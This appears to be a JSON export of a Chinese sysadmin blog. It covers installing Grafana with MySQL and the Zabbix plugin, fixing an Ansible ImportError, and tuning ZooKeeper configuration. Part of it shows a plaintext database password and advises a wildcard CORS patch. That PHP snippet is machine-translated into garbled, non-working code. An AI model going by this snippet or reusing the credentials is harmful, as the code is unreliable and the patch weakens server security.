1234567891011vim etc/yum.repos.d/grafana.repo[grafana]name=grafanabaseurl=https://packagecloud.io/grafana/stable/el/6/$basearchrepo_gpgcheck=1enabled=1gpgcheck=1gpgkey=https://packagecloud.io/gpg.key https://grafanarel.s3.amazonaws.com/RPM-GPG-KEY-grafanasslverify=1sslcacert=/etc/pki/tls/certs/ca-bundle.crt 还有，如果你想测试版或发布候选测试存储库。 1baseurl=https://packagecloud.io/grafana/testing/el/6/$basearch 然后通过安装Grafana yum的命令。 1$ sudo yum install grafana RPM GPG密钥RPM包进行签名，可以验证这个签名公共GPG密钥。 包装细节 安装二进制文件到 /usr/sbin/grafana-server 副本的init.d脚本/etc/init.d/grafana-server 默认的安装文件环境，以在/etc/sysconfig/grafana-server 拷贝配置文件/etc/grafana/grafana.ini 安装systemd服务（如果systemd可用）名称grafana-server.service 默认配置使用的日志文件在/var/log/grafana/grafana.log 默认配置指定以sqlite3的数据库/var/lib/grafana/grafana.db 启动服务（的init.d服务） 1$ sudo service grafana-server start 这将启动grafana服务进程作为grafana用户，这是包安装过程中创建。默认HTTP端口是 3000，和默认的用户和组管理。 要配置服务器Grafana在启动时启动： 1sudo /sbin/chkconfig --add grafana-server centos 7 系统启动服务： 123$ systemctl daemon-reload$ systemctl start grafana-server$ systemctl status grafana-server centos 7 设置开机启动 1sudo systemctl enable grafana-server.service 环境文件该systemd服务文件和脚本的init.d都使用位于文件 在/etc/sysconfig/grafana服务启动后端时所使用的环境变量。在这里，您可以覆盖日志目录，数据目录和其他变量。 记录默认情况下Grafana将记录到的/var/log/grafana 数据库默认配置指定位于一个sqlite3的数据库 /var/lib/grafana/grafana.db。请备份升级之前，这个数据库。你也可以使用MySQL或者Postgres作为Grafana数据库上详述配置页面。 组态该配置文件位于/etc/grafana/grafana.ini.去配置页面上的所有这些选项的详细信息。 配置http://docs.grafana.org/installation/configuration/#database 配置文件里分段给出了非常详细的说明，非常人性化 默认使用的是sqlite3的，这里我调整为自己MySQL的。 1.创建数据库和用户12345678mysql&gt; CREATE DATABASE grafana DEFAULT CHARACTER SET utf8;Query OK, 1 row affected (0.02 sec)mysql&gt; GRANT ALL ON grafana.* TO grafana@'192.168.1.%' IDENTIFIED BY 'haozhuo.com' WITH GRANT OPTION;Query OK, 0 rows affected (0.26 sec)mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.02 sec) 2.指定数据库及认证信息cp /etc/grafana/grafana.ini{,.default}vim /etc/grafana/grafana.ini 配置文件： 1234567891011121314151617[database]# Either \"mysql\", \"postgres\" or \"sqlite3\", it's your choicetype = mysqlhost = 192.168.1.201:3306name = grafanauser = grafanapassword = haozhuo.com[session]# Either \"memory\", \"file\", \"redis\", \"mysql\", \"postgres\", default is \"file\"provider = redisprovider_config = addr=127.0.0.1:6379,pool_size=100,db=grafana cookie_name = grafana_sesscookie_secure = false session_life_time = 86400 grafana.ini 配置文件详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143app_mode：应用名称，默认是production[path]data：一个grafana用来存储sqlite3、临时文件、回话的地址路径logs：grafana存储logs的路径[server]http_addr：监听的ip地址，，默认是0.0.0.0http_port：监听的端口，默认是3000protocol：http或者https，，默认是httpdomain：这个设置是root_url的一部分，当你通过浏览器访问grafana时的公开的domian名称，默认是localhostenforce_domain：如果主机的header不匹配domian，则跳转到一个正确的domain上，默认是falseroot_url：这是一个web上访问grafana的全路径url，默认是%(protocol)s://%(domain)s:%(http_port)s/router_logging：是否记录web请求日志，默认是falsecert_file：如果使用https则需要设置cert_key：如果使用https则需要设置[database]grafana默认需要使用数据库存储用户和dashboard信息，默认使用sqlite3来存储，你也可以换成其他数据库type：可以是mysql、postgres、sqlite3，默认是sqlite3path：只是sqlite3需要，定义sqlite3的存储路径host：只是mysql、postgres需要，默认是127.0.0.1:3306name：grafana的数据库名称，默认是grafanauser：连接数据库的用户password：数据库用户的密码ssl_mode：只是postgres使用[security]admin_user：grafana默认的admin用户，默认是adminadmin_password：grafana admin的默认密码，默认是adminlogin_remember_days：多少天内保持登录状态secret_key：保持登录状态的签名disable_gravatar：[users]allow_sign_up：是否允许普通用户登录，如果设置为false，则禁止用户登录，默认是true，则admin可以创建用户，并登录grafanaallow_org_create：如果设置为false，则禁止用户创建新组织，默认是trueauto_assign_org：当设置为true的时候，会自动的把新增用户增加到id为1的组织中，当设置为false的时候，新建用户的时候会新增一个组织auto_assign_org_role：新建用户附加的规则，默认是Viewer，还可以是Admin、Editor[auth.anonymous]enabled：设置为true，则开启允许匿名访问，默认是falseorg_name：为匿名用户设置组织名称org_role：为匿名用户设置的访问规则，默认是Viewer[auth.github]针对github项目的，很明显，呵呵enabled = falseallow_sign_up = falseclient_id = some_idclient_secret = some_secretscopes = user:emailauth_url = https://github.com/login/oauth/authorizetoken_url = https://github.com/login/oauth/access_tokenapi_url = https://api.github.com/userteam_ids =allowed_domains =allowed_organizations =[auth.google]针对google app的，呵呵enabled = falseallow_sign_up = falseclient_id = some_client_idclient_secret = some_client_secretscopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.emailauth_url = https://accounts.google.com/o/oauth2/authtoken_url = https://accounts.google.com/o/oauth2/tokenapi_url = https://www.googleapis.com/oauth2/v1/userinfoallowed_domains =[auth.basic]enabled：当设置为true，则http api开启基本认证[auth.ldap]enabled：设置为true则开启LDAP认证，默认是falseconfig_file：如果开启LDAP，指定LDAP的配置文件/etc/grafana/ldap.toml[auth.proxy]允许你在一个HTTP反向代理上进行认证设置enabled：默认是falseheader_name：默认是X-WEBAUTH-USERheader_property：默认是个名称usernameauto_sign_up：默认是true。开启自动注册，如果用户在grafana DB中不存在[analytics]reporting_enabled：如果设置为true，则会发送匿名使用分析到stats.grafana.org，主要用于跟踪允许实例、版本、dashboard、错误统计。默认是truegoogle_analytics_ua_id：使用GA进行分析，填写你的GA ID即可[dashboards.json]如果你有一个系统自动产生json格式的dashboard，则可以开启这个特性试试enabled：默认是falsepath：一个全路径用来包含你的json dashboard，默认是/var/lib/grafana/dashboards[session]provider：默认是file，值还可以是memory、mysql、postgresprovider_config：这个值的配置由provider的设置来确定，如果provider是file，则是data/xxxx路径类型，如果provider是mysql，则是user:password@tcp(127.0.0.1:3306)/database_name，如果provider是postgres，则是user=a password=b host=localhost port=5432 dbname=c sslmode=disablecookie_name：grafana的cookie名称cookie_secure：如果设置为true，则grafana依赖https，默认是falsesession_life_time：session过期时间，默认是86400秒，24小时以下是官方文档没有，配置文件中有的[smtp]enabled = falsehost = localhost:25user =password =cert_file =key_file =skip_verify = falsefrom_address = admin@grafana.localhost[emails]welcome_email_on_sign_up = falsetemplates_pattern = emails/*.html[log]mode：可以是console、file，默认是console、file，也可以设置多个，用逗号隔开buffer_len：channel的buffer长度，默认是10000level：可以是\"Trace\", \"Debug\", \"Info\", \"Warn\", \"Error\", \"Critical\"，默认是info[log.console]level：设置级别[log.file]level：设置级别log_rotate：是否开启自动轮转max_lines：单个日志文件的最大行数，默认是1000000max_lines_shift：单个日志文件的最大大小，默认是28，表示256MBdaily_rotate：每天是否进行日志轮转，默认是truemax_days：日志过期时间，默认是7,7天后删除 3.重启grafanaservice grafana-server restarttail -f /var/log/grafana/grafana.log 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@LAN_zabbix ~]# tail -f /var/log/grafana/grafana.logt=2016-07-14T00:49:01+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table dashboard to dashboard_v1 - v1\"t=2016-07-14T00:49:01+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_dashboard_org_id - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_org_id_slug - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy dashboard v1 to v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop table dashboard_v1\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"alter dashboard.data to mediumtext v1\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column updated_by in dashboard - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column created_by in dashboard - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column gnetId in dashboard\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add index for gnetId in dashboard\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create data_source table\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index data_source.account_id\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add unique index data_source.account_id_name\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index IDX_data_source_account_id - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_data_source_account_id_name - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table data_source to data_source_v1 - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create data_source table v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_data_source_org_id - v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_data_source_org_id_name - v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy data_source v1 to v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table data_source_v1 #2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column with_credentials\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create api_key table\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.account_id\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.key\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.account_id_name\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index IDX_api_key_account_id - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_api_key_key - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_api_key_account_id_name - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table api_key to api_key_v1 - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create api_key table v2\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_api_key_org_id - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_api_key_key - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_api_key_org_id_name - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy api_key v1 to v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table api_key_v1\"t=2016-07-14T00:49:06+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard_snapshot table v4\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop table dashboard_snapshot_v4 #1\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard_snapshot table v5 #2\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_snapshot_key - v5\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_snapshot_delete_key - v5\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_dashboard_snapshot_user_id - v5\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"alter dashboard_snapshot to mediumtext v2\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create quota table v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_quota_org_id_user_id_target - v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create plugin_setting table\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_plugin_setting_org_id_plugin_id - v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create session table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table playlist table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table playlist_item table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create playlist table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create playlist item table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop preferences table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop preferences table v3\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create preferences table v3\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Created default admin user: [admin]\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Starting plugin search\" logger=pluginst=2016-07-14T00:49:20+0800 lvl=eror msg=\"Plugins: Failed to load plugin json file: [/usr/share/grafana/public/app/plugins/datasource/zabbix/plugin.json invalid character '\\\"' after object key:value pair], err: %!v(MISSING)\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Server Listening\" logger=server address=0.0.0.0:3000 protocol=http subUrl= logger=server address=0.0.0.0:3000 protocol=http Dashboardweb: http://192.168.1.220:3000 默认用户名:admin 默认用户名密码:admin 登录后一片空白，所以需要安装相应插件。 grafana-zabbix插件12345https://github.com/alexanderzobnin/grafana-zabbixhttp://play.grafana-zabbix.org/http://docs.grafana-zabbix.org/installation/http://docs.grafana-zabbix.org/installation/configuration/https://grafana.net/plugins/alexanderzobnin-zabbix-app/installation 1.安装插件 官网讲的非常详细参考链接：http://docs.grafana-zabbix.org/installation/ 12345678[root@LAN_zabbix ~]# grafana-cli plugins install alexanderzobnin-zabbix-appinstalling alexanderzobnin-zabbix-app @ 3.0.0from url: https://grafana.net/api/plugins/alexanderzobnin-zabbix-app/versions/3.0.0/downloadinto: /var/lib/grafana/plugins✔ Installed alexanderzobnin-zabbix-app successfullyRestart grafana after installing plugins . &lt;service grafana-server restart&gt; 然后在登陆查看，这里已经安装上zabbix插件了。 三、grafana使用grafana的仪表和zabbix的监控差不多，基本是先创建监控模板、监控项，然后再添加仪表。这里先建立数据源，再创建仪表对象，并添加模板，最后添加仪表。 可参考：https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage 组态启用插件 转到Grafana侧面板插件，选择应用程序选项卡，然后选择的zabbix，打开配置 选项卡并启用插件。 1.配置zabbix数据源 启用插件后可以添加的zabbix数据源。 要添加新的zabbix数据源公开数据源在侧面板中，单击添加数据源，并选择的zabbix从下拉列表中。 http://192.168.1.220/zabbix/api_jsonrpc.php 注意: api_jsonrpc.php是zabbix的API调用接口 HTTP设置 网址：设置的zabbix API URL（完整路径api_jsonrpc.php）。 访问： 代理：通过Grafana后端访问 直接：从浏览器访问。 HTTP认证：配置如果使用代理验证。 基本认证： 凭据：代理访问意味着Grafana后端将代理从浏览器的所有请求，并送他们到数据源。这是有用的，因为它可以消除CORS（跨产地站点资源）的问题，以及消除需要​​宣传认证细节数据源到浏览器。 直接访问仍然支持，因为在某些情况下，可能是有用的直接访问数据源取决于Grafana，用户，和数据源的使用情况和拓扑。 ZABBIX API细节 用户和密码：设置登录访问的zabbix API。同时检查用户的权限的zabbix如果你不能得到任何组和主机的Grafana。 趋势：启用如果您使用的zabbix 3.x或补丁中的zabbix 2.x的趋势支撑（ZBXNEXT-1193）。此选项严格推荐用于显示时间长周期（超过几天，在不同的zabbix您的项目的更新间隔的），因为项目历史几天包含吨的点。使用趋势将增加Grafana性能。 从使用趋势之后的趋势将被使用的时间。默认值是7天（7天）。您可以在Grafana格式的时间。有效时间specificators是： ^ h -小时 ð -天 中号 -个月 缓存更新间隔：插件缓存提高性能的一些API请求。将该值设置为所需的缓存生存期（此选项影响类的物品列表数据）。然后单击添加 -数据源将被添加，您可以使用检查连接 测试连接按钮。此功能可以帮助找到一些错误，类似于无效的用户名或密码，错误的API网址。 导入示例仪表板您可以从仪表盘导入示例仪表板选项卡中的插件配置。 请注意有关的zabbix 2.2或更低ZABBIX 2.4之前的zabbix API（api_jsonrpc.php）不允许跨域请求（CORS）。你可以得到HTTP错误412（预处理失败）。要修复它添加此代码的版权后，立即api_jsonrpc.php： 12345678910111213 标题（“访问控制允许来源：*'）; 标题（“访问控制允许信头：Content-Type的'）;标题（“访问控制允许的方法：POST'）;标题（“访问控制，最大年龄：1000'）;如果（$ _ SERVER [ 'REQUEST_METHOD' ] === '选项'）&#123; 返回 ; &#125; 之前 12require_once dirname( __FILE__ ). '/include/func.inc.php' ;require_once dirname( __FILE__ ). '/include/classes/core/CHttpRequest.php' ; 完全修复上市。欲了解更多详情，请参见ZABBIX发出ZBXNEXT-1377 和ZBX-8459。请注意有关浏览器缓存 更新插件，清除浏览器缓存和重新加载应用程序页面后。详情请参见铬， 火狐。您需要清除缓存而已，没有Cookie，历史记录和其他数据。 升级从2.X升级后启用的zabbix应用到数据源，打开你的配置的zabbix数据源端选择的zabbix从类型列表中再次。这是必要的，因为插件ID在Grafana 3.0改变。 ###入门Grafana-zabbix 你经过安装和配置Grafana-zabbix数据源，让我们创建一个简单的仪表板。 下面是自带的模板，自己新建的模板在我github上面有详细的创建步骤。 入门gafana创建仪表板：Grafana-github 可参考：https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"Ansible安装出现 ImportError/ No module named _text","slug":"自动化+可视化/Ansible/ansible 安装出现 ImportError: No module named _text","date":"2016-06-10T09:56:03.000Z","updated":"2017-04-12T13:41:41.000Z","comments":true,"path":"2016/06/10/自动化+可视化/Ansible/ansible 安装出现 ImportError: No module named _text/","link":"","permalink":"http://blog.yangcvo.me/2016/06/10/自动化+可视化/Ansible/ansible 安装出现 ImportError: No module named _text/","excerpt":"","text":"centos6.7 ansible yum安装出现问题：12345ansible --versionTraceback (most recent call last): File \"/usr/bin/ansible\", line 46, in &lt;module&gt; from ansible.module_utils._text import to_textImportError: No module named _text 提示这个错误，后面查看官网epel包需要更新，这里我已更新发现还是有问题。 解决方法：使用pip install安装过ansible就正常使用12345678910111213141516171819202122232425262728[root@ansible_01 ~]# pip install ansibleCollecting ansible Downloading ansible-1.9.4.tar.gz (937kB) 100% |████████████████████████████████| 937kB 100kB/s Collecting paramiko (from ansible) Downloading paramiko-1.15.3-py2.py3-none-any.whl (166kB) 100% |████████████████████████████████| 167kB 136kB/s Collecting jinja2 (from ansible) Downloading Jinja2-2.8-py2.py3-none-any.whl (263kB) 100% |████████████████████████████████| 266kB 1.4MB/s Collecting PyYAML (from ansible) Downloading PyYAML-3.11.tar.gz (248kB) 100% |████████████████████████████████| 249kB 72kB/s Requirement already satisfied (use --upgrade to upgrade): setuptools in /usr/local/python27/lib/python2.7/site-packages/setuptools-18.4-py2.7.egg (from ansible)Collecting pycrypto&gt;=2.6 (from ansible) Downloading pycrypto-2.6.1.tar.gz (446kB) 100% |████████████████████████████████| 446kB 117kB/s Collecting ecdsa&gt;=0.11 (from paramiko-&gt;ansible) Downloading ecdsa-0.13-py2.py3-none-any.whl (86kB) 100% |████████████████████████████████| 90kB 141kB/s Collecting MarkupSafe (from jinja2-&gt;ansible) Downloading MarkupSafe-0.23.tar.gzInstalling collected packages: ecdsa, pycrypto, paramiko, MarkupSafe, jinja2, PyYAML, ansible Running setup.py install for pycrypto Running setup.py install for MarkupSafe Running setup.py install for PyYAML Running setup.py install for ansibleSuccessfully installed MarkupSafe-0.23 PyYAML-3.11 ansible-1.9.4 ecdsa-0.13 jinja2-2.8 paramiko-1.15.3 pycrypto-2.6.1 如果提示没有No package &#39;libffi&#39; found 1yum install libffi-devel 如果可以正常显示不需要设置 如果还是有问题设置下依赖： 12345678910111213141516[root@ansible_01 ~]# find / -name ansible/etc/ansible/usr/local/bin/ansible/usr/local/src/ansible/usr/local/src/ansible/docsite/js/ansible/usr/local/src/ansible/bin/ansible/usr/local/src/ansible/packaging/port/sysutils/ansible/usr/local/src/ansible/packaging/macports/sysutils/ansible/usr/local/src/ansible/build/scripts-2.6/ansible/usr/local/src/ansible/build/lib/ansible/usr/local/src/ansible/lib/ansible/usr/local/src/ansible/.git/modules/lib/ansible/usr/local/lib/python2.7/site-packages/ansible/usr/lib/python2.6/site-packages/ansible-2.1.0-py2.6.egg/ansible/usr/lib/python2.6/site-packages/ansible-2.1.0-py2.6.egg/EGG-INFO/scripts/ansible/home/ansible 然后安装完成正常显示版本信息： 123456 ln -s /usr/local/bin/ansible /usr/bin/ansible [root@LAN_zabbix pip-9.0.1]# ansible --versionansible 2.2.1.0 config file = configured module search path = Default w/o overrides","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"ZooKeeper的配置详解优化","slug":"大数据hadoop/zookeeper/ZooKeeper的配置详解优化","date":"2016-05-28T06:46:00.000Z","updated":"2017-04-12T07:32:34.000Z","comments":true,"path":"2016/05/28/大数据hadoop/zookeeper/ZooKeeper的配置详解优化/","link":"","permalink":"http://blog.yangcvo.me/2016/05/28/大数据hadoop/zookeeper/ZooKeeper的配置详解优化/","excerpt":"","text":"前言ZooKeeper的功能特性通过 ZooKeeper 配置文件来进行控制管理（ zoo.cfg 配置文件）。 ZooKeeper 这样的设计其实是有它自身的原因的。通过前面对 ZooKeeper 的配置可以看出，对 ZooKeeper集群进行配置的时候，它的配置文档是完全相同的（对于集群伪分布模式来说，只有很少的部分是不同的）。这样的配置方使得在部署 ZooKeeper 服务的时候非常地方便。另外，如果服务器使用不同的配置文件，必须要确保不同配置文件中的服务器列表相匹配。 在设置 ZooKeeper 配置文档的时候，某些参数是可选的，但是某些参数是必须的。这些必须的参数就构成了ZooKeeper 配置文档的最低配置要求。 最近发现在用zookeeper出现经常出现连接超时，出现连接中断，数据丢失等原因。后面看了官网配置自己整理优化几点：1234567891011121314151617181920212223242526272829303132332.1错误日志：2016-04-11 15:00:58,981 [myid:] - WARN [SyncThread:0:FileTxnLog@334] - fsync-ing the write ahead log in SyncThread:0 took 13973ms which will adversely effect operation latency. See the ZooKeeper troubleshooting guide&gt;2.2，错误原因分析“FOLLOWER”在跟“LEADER”同步时，fsync操作时间过长，导致超时。第一步：分析服务器问题：我查看了服务器io和负载都不高。内存空间实际使用率不高。可是编辑文件出现了卡顿.可以发现：服务器并没有占用很多内存的进程；服务器也没有存在很多的进程；cat /var/log/message查看系统日志并没有发现什么异常；另外ping服务器只有0.1ms多的延迟，因此不是网络问题。后面发现硬盘有故障重新更换了一块硬盘。或者更换服务器。&gt;2.3，错误解决增加“tickTime”或者“initLimit和syncLimit”的值，或者两者都增大。&gt;2.4，其他这个错误在上线“使用ZooKeeper获取地址方案”之前也存在，只不过过没有这么高频率，而上线了“ZooKeeper获取地址方案”之后，ZooKeeper Server之间的同步数据量增大，ZooKeeper Server的负载加重，因而最终导致高频率出现上述错误。 下面是在最低配置要求中必须配置的参数：1234567891011121314151617### 最小配置最小配置意味着所有的配置文件中必须要包含这些配置选项。#### clientPort服务器监听客户端连接的端口, 亦即客户端尝试连接到服务器上的指定端口。##### dataDirZooKeeper 存储内存数据库快照文件的路径, 并且如果没有指定其它路径的话, 数据库更新的事务日志也将存储到该路径下。注意: 事务日志会影响 ZooKeeper 服务器的整体性能, 所以建议将事务日志放置到由 dataLogDir 参数指定的路径下。##### tickTime单个 tick 的时间长度, 它是 ZooKeeper 中使用的基本时间单元, 以毫秒为单位。它用来调节心跳和超时时间。例如, 最小会话超时时间是 2 个 tick。 生产环境例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849501.tickTime：CS通信心跳数Zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个 tickTime 时间就会发送一个心跳。tickTime以毫秒为单位。tickTime=2000 2.initLimit：LF初始通信时限集群中的follower服务器(F)与leader服务器(L)之间初始连接时能容忍的最多心跳数（tickTime的数量）。initLimit=5 3.syncLimit：LF同步通信时限集群中的follower服务器与leader服务器之间请求和应答之间能容忍的最多心跳数（tickTime的数量）。syncLimit=2 4.dataDir：数据文件目录Zookeeper保存数据的目录，默认情况下，Zookeeper将写数据的日志文件也保存在这个目录里。dataDir=/home/michael/opt/zookeeper/data 5.dataLogDir：日志文件目录Zookeeper保存日志文件的目录。dataLogDir=/home/michael/opt/zookeeper/log 6.clientPort：客户端连接端口客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。clientPort=2333 7.服务器名称与地址：集群信息（服务器编号，服务器地址，LF通信端口，选举端口）这个配置项的书写格式比较特殊，规则如下：server.N=YYY:A:B 其中N表示服务器编号，YYY表示服务器的IP地址，A为LF通信端口，表示该服务器与集群中的leader交换的信息的端口。B为选举端口，表示选举新leader时服务器间相互通信的端口（当leader挂掉时，其余服务器会相互通信，选择出新的leader）。一般来说，集群中每个服务器的A端口都是一样，每个服务器的B端口也是一样。但是当所采用的为伪集群时，IP地址都一样，只能时A端口和B端口不一样。下面是一个非伪集群的例子：server.0=233.34.9.144:2008:6008 server.1=233.34.9.145:2008:6008 server.2=233.34.9.146:2008:6008 server.3=233.34.9.147:2008:6008 下面是一个伪集群的例子：server.0=127.0.0.1:2008:6008 server.1=127.0.0.1:2007:6007 server.2=127.0.0.1:2006:6006 server.3=127.0.0.1:2005:6005 高级配置本节的配置选项是可选的。你可以使用它们进一步的优化 ZooKeeper 服务器的行为。有些可以使用 Java 系统属性来设置, 一般的格式是 “zookeeper.keyword”。如果有具体的系统属性, 会在配置选项下面标注出来。 dataLogDir没有对应的 Java 系统属性。 该参数用于配置 ZooKeeper 服务器存储事务日志文件的路径, ZooKeeper 默认将事务日志文件和数据快照存储在同一个目录下, 应尽量将它们分开存储。 注意: 将事务日志文件存储到一个专门的日志设备上对于服务器的吞吐量和稳定的延迟有很大的影响。事务日志对磁盘性能要求比较高, 为了保证数据一致性, ZooKeeper 在响应客户端事务请求之前, 需要将请求的事务日志写到磁盘上, 所以事务日志的写入性能直接影响 ZooKeeper 服务器处理请求的吞吐。所以建议给事务日志的输出配置一个单独的磁盘或者挂载点。 globalOutstandingLimit对应的 Java 系统属性: zookeeper.globalOutstandingLimit。 客户端提交请求的速度可能比 ZooKeeper 处理的速度快得多, 特别是当客户端的数量非常多的时候。为了防止 ZooKeeper 因为排队的请求而耗尽内存, ZooKeeper 将会对客户端进行限流, 即限制系统中未处理的请求数量不超过 globalOutstandingLimit 设置的值。默认的限制是 1,000。 preAllocSize对应的 Java 系统属性: zookeeper.preAllocSize。 用于配置 ZooKeeper 事务日志文件预分配的磁盘空间大小。默认的块大小是 64M。改变块大小的其中一个原因是当数据快照文件生成比较频繁时可以适当减少块大小。比如 1000 次事务会新产生一个快照(参数为snapCount), 新产生快照后会用新的事务日志文件, 假设一个事务信息大小100b, 那么事务日志预分配的磁盘空间大小为100kb会比较好。 snapCount对应的 Java 系统属性: zookeeper.snapCount。 ZooKeeper 将事务记录到事务日志中。当 snapCount 个事务被写到一个日志文件后, 启动一个快照并创建一个新的事务日志文件。snapCount 的默认值是 100,000。 traceFile对应的 Java 系统属性: requestTraceFile。 如果定义了该选项, 那么请求将会记录到一个名为 traceFile.year.month.day 的跟踪文件中。使用该选项可以提供很有用的调试信息, 但是会影响性能。 注意: requestTraceFile 这个系统属性没有 zookeeper 前缀, 